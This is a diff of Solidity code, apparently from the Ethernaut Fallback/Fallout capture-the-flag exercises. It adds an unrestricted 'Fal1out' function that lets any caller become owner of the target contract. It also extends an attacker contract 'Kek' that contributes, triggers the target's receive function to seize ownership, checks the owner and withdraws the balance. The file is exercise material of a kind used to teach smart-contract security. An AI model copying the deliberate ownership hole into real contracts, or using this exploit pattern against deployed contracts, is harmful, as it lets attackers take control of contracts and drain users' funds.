@@ -10,6 +10,10 @@ contract Fallback {
         contributions[msg.sender] = 1000 * (1 ether);
     }
 
+    function Fal1out() public payable {
+        owner = msg.sender;
+
+    }
     modifier onlyOwner() {
         require(msg.sender == owner, "caller is not the owner");
         _;
@@ -38,28 +42,39 @@ contract Fallback {
 }
 interface FallbacI {
     function contribute() external payable;
+    function owner() external view returns (address);
 }
 contract Kek {
-    address payable contractAddress ;
+    address payable contractAddress;
     address owner;
     FallbacI public fallbackContract;
+
     constructor(address payable _contractAddress) {
         owner = msg.sender;
-    contractAddress =    _contractAddress;
-    fallbackContract = FallbacI(_contractAddress);
+        contractAddress = _contractAddress;
+        fallbackContract = FallbacI(_contractAddress);
     }
-receive() external payable {
-}
-function fallkek() public  payable{
-    require(msg.sender == owner);
-   (bool success,) = (contractAddress).call{value:msg.value}("");
-   require(success); 
+    receive() external payable {}
+
+    function fallkek() public payable {
+        require(msg.sender == owner);
+        (bool success, ) = (contractAddress).call{value: msg.value}("");
+        require(success);
     }
 
- function   deposit() external  payable {}
+    function deposit() external payable {}
 
- function getContribute() public payable  {
- require(msg.sender == owner);
-fallbackContract.contribute{value: msg.value}();
- }
+    function getContribute() public payable {
+        require(msg.sender == owner);
+        fallbackContract.contribute{value: 0.0009 ether}();
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    function whoOwner() public view returns (address) {
+        return fallbackContract.owner();
+    }
 }
